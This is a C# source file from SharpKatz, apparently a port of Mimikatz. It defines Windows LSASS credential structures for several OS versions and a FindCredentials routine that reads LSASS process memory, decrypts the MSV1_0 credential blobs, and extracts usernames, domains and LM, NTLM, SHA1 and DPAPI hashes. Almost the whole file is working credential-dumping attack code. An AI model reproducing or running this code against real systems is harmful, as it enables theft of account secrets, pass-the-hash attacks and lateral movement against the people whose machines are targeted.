﻿using SharpKatz.Credential;
using SharpKatz.Crypto;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using static SharpKatz.Natives;

namespace SharpKatz.Module
{
    class Msv1
    {
        
        [StructLayout(LayoutKind.Sequential)]
        public struct LIST_ENTRY
        {
            public IntPtr Flink;
            public IntPtr Blink;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct KIWI_MSV1_0_PRIMARY_CREDENTIALS
        {
            public IntPtr next; //KIWI_MSV1_0_PRIMARY_CREDENTIALS
            public Natives.UNICODE_STRING Primary; //ANSI_STRING
            public Natives.UNICODE_STRING Credentials;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct KIWI_MSV1_0_CREDENTIALS
        {
            public IntPtr next; //KIWI_MSV1_0_CREDENTIALS
            public uint AuthenticationPackageId; //DWORD
            public IntPtr PrimaryCredentials; //KIWI_MSV1_0_PRIMARY_CREDENTIALS
        }

        [StructLayout(LayoutKind.Sequential)]
        public unsafe struct KIWI_MSV1_0_LIST_63
        {
            public IntPtr Flink;   //KIWI_MSV1_0_LIST_63 off_2C5718
            public IntPtr Blink; //KIWI_MSV1_0_LIST_63 off_277380
            public IntPtr unk0; // unk_2C0AC8
            public uint unk1; // 0FFFFFFFFh
            public IntPtr unk2; // 0
            public uint unk3; // 0
            public uint unk4; // 0
            public uint unk5; // 0A0007D0h
            public IntPtr hSemaphore6; // 0F9Ch
            public IntPtr unk7; // 0
            public IntPtr hSemaphore8; // 0FB8h
            public IntPtr unk9; // 0
            public IntPtr unk10; // 0
            public uint unk11; // 0
            public uint unk12; // 0 
            public IntPtr unk13; // unk_2C0A28
            public Natives.LUID LocallyUniqueIdentifier;
            public Natives.LUID SecondaryLocallyUniqueIdentifier;
            public fixed byte waza[12]; /// to do (maybe align)
            public Natives.UNICODE_STRING UserName;
            public Natives.UNICODE_STRING Domaine;
            public IntPtr unk14;
            public IntPtr unk15;
            public Natives.UNICODE_STRING Type;
            public IntPtr pSid; //PSID
            public uint LogonType;
            public IntPtr unk18;
            public uint Session;
            public Natives.LARGE_INTEGER LogonTime;
            public Natives.UNICODE_STRING LogonServer;
            public IntPtr Credentials; //PKIWI_MSV1_0_CREDENTIALS
            public IntPtr unk19;
            public IntPtr unk20;
            public IntPtr unk21;
            public uint unk22;
            public uint unk23;
            public uint unk24;
            public uint unk25;
            public uint unk26;
            public IntPtr unk27;
            public IntPtr unk28;
            public IntPtr unk29;
            public IntPtr CredentialManager;
        }

        [StructLayout(LayoutKind.Sequential)]
        public unsafe struct KIWI_MSV1_0_LIST_62
        {
            public IntPtr Flink;
            public IntPtr Blink;
            public IntPtr unk0;
            public int unk1;
            public IntPtr unk2;
            public int unk3;
            public int unk4;
            public int unk5;
            public IntPtr hSemaphore6;
            public IntPtr unk7;
            public IntPtr hSemaphore8;
            public IntPtr unk9;
            public IntPtr unk10;
            public int unk11;
            public int unk12;
            public IntPtr unk13;
            Natives.LUID LocallyUniqueIdentifier;
            Natives.LUID SecondaryLocallyUniqueIdentifier;
            Natives.UNICODE_STRING UserName;
            Natives.UNICODE_STRING Domaine;
            public IntPtr unk14;
            public IntPtr unk15;
            Natives.UNICODE_STRING Type;
            public IntPtr pSid;
            public int LogonType;
            public IntPtr unk18;
            public int Session;
            Natives.LARGE_INTEGER LogonTime; // autoalign x86
            Natives.UNICODE_STRING LogonServer;
            public IntPtr Credentials;
            public IntPtr unk19;
            public IntPtr unk20;
            public IntPtr unk21;
            public int unk22;
            public int unk23;
            public int unk24;
            public int unk25;
            public int unk26;
            public IntPtr unk27;
            public IntPtr unk28;
            public IntPtr unk29;
            public IntPtr CredentialManager;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct KIWI_GENERIC_PRIMARY_CREDENTIAL
        {
            public Natives.UNICODE_STRING Domaine;
            public Natives.UNICODE_STRING UserName;
            public Natives.UNICODE_STRING Password;
        }

        const int LM_NTLM_HASH_LENGTH = 16;
        const int SHA_DIGEST_LENGTH = 20;

        [StructLayout(LayoutKind.Sequential)]
        public unsafe struct MSV1_0_PRIMARY_CREDENTIAL
        {
            Natives.UNICODE_STRING LogonDomainName;
            Natives.UNICODE_STRING UserName;
            fixed byte NtOwfPassword[LM_NTLM_HASH_LENGTH];
            fixed byte LmOwfPassword[LM_NTLM_HASH_LENGTH];
            fixed byte ShaOwPassword[SHA_DIGEST_LENGTH];
            byte isNtOwfPassword;
            byte isLmOwfPassword;
            byte isShaOwPassword;
            /* buffer */
        }

        [StructLayout(LayoutKind.Sequential)]
        public unsafe struct MSV1_0_PRIMARY_CREDENTIAL_10_OLD
        {
            Natives.UNICODE_STRING LogonDomainName;
            Natives.UNICODE_STRING UserName;
            byte isIso;
            byte isNtOwfPassword;
            byte isLmOwfPassword;
            byte isShaOwPassword;
            byte align0;
            byte align1;
            fixed byte NtOwfPassword[LM_NTLM_HASH_LENGTH];
            fixed byte LmOwfPassword[LM_NTLM_HASH_LENGTH];
            fixed byte ShaOwPassword[SHA_DIGEST_LENGTH];
            /* buffer */
        }

        [StructLayout(LayoutKind.Sequential)]
        public unsafe struct MSV1_0_PRIMARY_CREDENTIAL_10
        {
            Natives.UNICODE_STRING LogonDomainName;
            Natives.UNICODE_STRING UserName;
            byte isIso;
            byte isNtOwfPassword;
            byte isLmOwfPassword;
            byte isShaOwPassword;
            byte align0;
            byte align1;
            byte align2;
            byte align3;
            fixed byte NtOwfPassword[LM_NTLM_HASH_LENGTH];
            fixed byte LmOwfPassword[LM_NTLM_HASH_LENGTH];
            fixed byte ShaOwPassword[SHA_DIGEST_LENGTH];
            /* buffer */
        }

        [StructLayout(LayoutKind.Sequential)]
        public unsafe struct MSV1_0_PRIMARY_CREDENTIAL_10_1607
        {
            Natives.UNICODE_STRING LogonDomainName;
            Natives.UNICODE_STRING UserName;
            IntPtr pNtlmCredIsoInProc;
            byte isIso;
            byte isNtOwfPassword;
            byte isLmOwfPassword;
            byte isShaOwPassword;
            byte isDPAPIProtected;
            byte align0;
            byte align1;
            byte align2;
            uint unkD; // 1/2 DWORD
                       //#pragma pack(push, 2)
            ushort isoSize;  // 0000 WORD
            fixed byte DPAPIProtected[LM_NTLM_HASH_LENGTH];
            uint align3; // 00000000 DWORD
                         //#pragma pack(pop) 
            fixed byte NtOwfPassword[LM_NTLM_HASH_LENGTH];
            fixed byte LmOwfPassword[LM_NTLM_HASH_LENGTH];
            fixed byte ShaOwPassword[SHA_DIGEST_LENGTH];
            /* buffer */
        }

        public static unsafe int FindCredentials(IntPtr hLsass, OSVersionHelper oshelper, byte[] iv, byte[] aeskey, byte[] deskey, List<Logon> logonlist)
        {

            foreach(Logon logon in logonlist)
            {
                IntPtr lsasscred = logon.pCredentials;
                LUID luid = logon.LogonId;
                if (lsasscred != IntPtr.Zero)
                {

                    Msv msventry = new Msv();

                    /*Console.WriteLine("[*] Authentication Id : {0} ; {1} ({2:X}:{3:X})", luid.HighPart, luid.LowPart, luid.HighPart, luid.LowPart);
                    Console.WriteLine("[*] Session {0} from {1}", KUHL_M_SEKURLSA_LOGON_TYPE[logonsession.LogonType], logonsession.Session);
                    Console.WriteLine("[*] UserName {0}", logonsession.UserName);
                    Console.WriteLine("[*] LogonDomain {0}", logonsession.LogonDomain);
                    Console.WriteLine("[*] LogonServer {0}", logonsession.LogonServer);*/
                    
                    KIWI_MSV1_0_PRIMARY_CREDENTIALS primaryCredentials;

                    while (lsasscred != IntPtr.Zero)
                    {
                        byte[] credentialsBytes = Utility.ReadFromLsass(ref hLsass, lsasscred, Convert.ToUInt64(sizeof(KIWI_MSV1_0_CREDENTIALS)));
                        
                        IntPtr pPrimaryCredentials = new IntPtr(BitConverter.ToInt64(credentialsBytes, Utility.FieldOffset<KIWI_MSV1_0_CREDENTIALS>("PrimaryCredentials")));
                        IntPtr pNext = new IntPtr(BitConverter.ToInt64(credentialsBytes, Utility.FieldOffset<KIWI_MSV1_0_CREDENTIALS>("next")));

                        lsasscred = pPrimaryCredentials;
                        while (lsasscred != IntPtr.Zero)
                        {
                            byte[] primaryCredentialsBytes = Utility.ReadFromLsass(ref hLsass, lsasscred, Convert.ToUInt64(sizeof(KIWI_MSV1_0_PRIMARY_CREDENTIALS)));
                            primaryCredentials = Utility.ReadStruct<KIWI_MSV1_0_PRIMARY_CREDENTIALS>(primaryCredentialsBytes);
                            primaryCredentials.Credentials = Utility.ExtractUnicodeString(hLsass, IntPtr.Add(lsasscred, oshelper.MSV1CredentialsOffset));
                            primaryCredentials.Primary = Utility.ExtractUnicodeString(hLsass, IntPtr.Add(lsasscred, oshelper.MSV1PrimaryOffset));

                            if (Utility.ExtractANSIStringString(hLsass, primaryCredentials.Primary).Equals("Primary"))
                            {

                                byte[] msvCredentialsBytes = Utility.ReadFromLsass(ref hLsass, primaryCredentials.Credentials.Buffer, (ulong)primaryCredentials.Credentials.MaximumLength);

                                byte[] msvDecryptedCredentialsBytes = BCrypt.DecryptCredentials(msvCredentialsBytes, iv, aeskey, deskey);

                                UNICODE_STRING usLogonDomainName = Utility.ReadStruct<UNICODE_STRING>(Utility.GetBytes(msvDecryptedCredentialsBytes, oshelper.LogonDomainNameOffset, sizeof(UNICODE_STRING)));
                                UNICODE_STRING usUserName = Utility.ReadStruct<UNICODE_STRING>(Utility.GetBytes(msvDecryptedCredentialsBytes, oshelper.UserNameOffset, sizeof(UNICODE_STRING)));

                                msventry = new Msv();
                                msventry.DomainName = Encoding.Unicode.GetString(Utility.GetBytes(msvDecryptedCredentialsBytes, usLogonDomainName.Buffer.ToInt32(), usLogonDomainName.MaximumLength)); 
                                msventry.UserName = Encoding.Unicode.GetString(Utility.GetBytes(msvDecryptedCredentialsBytes, usUserName.Buffer.ToInt32(), usUserName.MaximumLength));
                                msventry.Lm = Utility.PrintHashBytes(Utility.GetBytes(msvDecryptedCredentialsBytes, oshelper.LmOwfPasswordOffset, LM_NTLM_HASH_LENGTH));
                                msventry.Ntlm = Utility.PrintHashBytes(Utility.GetBytes(msvDecryptedCredentialsBytes, oshelper.NtOwfPasswordOffset, LM_NTLM_HASH_LENGTH));
                                msventry.Sha1 = Utility.PrintHashBytes(Utility.GetBytes(msvDecryptedCredentialsBytes, oshelper.ShaOwPasswordOffset, SHA_DIGEST_LENGTH));
                                msventry.Dpapi = Utility.PrintHashBytes(Utility.GetBytes(msvDecryptedCredentialsBytes, oshelper.DPAPIProtectedOffset, LM_NTLM_HASH_LENGTH));
                                /*Console.WriteLine("[*]\t Username : {0} ", Marshal.PtrToStringUni(IntPtr.Add(msvCredentials, usUserName.Buffer.ToInt32())));
                                Console.WriteLine("[*]\t Domain   : {0} ", Marshal.PtrToStringUni(IntPtr.Add(msvCredentials, usLogonDomainName.Buffer.ToInt32())));
                                Console.Write("[*]\t LM       : ");
                                Utility.PrintHash(IntPtr.Add(msvCredentials, oshelper.LmOwfPasswordOffset), LM_NTLM_HASH_LENGTH);
                                Console.Write("[*]\t NTLM     : ");
                                Utility.PrintHash(IntPtr.Add(msvCredentials, oshelper.NtOwfPasswordOffset), LM_NTLM_HASH_LENGTH);
                                Console.Write("[*]\t SHA1     : ");
                                Utility.PrintHash(IntPtr.Add(msvCredentials, oshelper.ShaOwPasswordOffset), SHA_DIGEST_LENGTH);
                                Console.Write("[*]\t DPAPI    : ");
                                Utility.PrintHash(IntPtr.Add(msvCredentials, oshelper.DPAPIProtectedOffset), LM_NTLM_HASH_LENGTH);
                                Console.WriteLine("\n");*/

                                Logon currentlogon = logonlist.FirstOrDefault(x => x.LogonId.HighPart == luid.HighPart && x.LogonId.LowPart == luid.LowPart);
                                if (currentlogon == null)
                                {
                                    Console.WriteLine("[x] Something goes wrong");
                                }
                                else
                                {
                                    currentlogon.Msv = msventry;
                                }

                            }
                            lsasscred = primaryCredentials.next;
                        }
                        lsasscred = pNext;
                    }
                }

            } 

            return 0;
        }
    }
}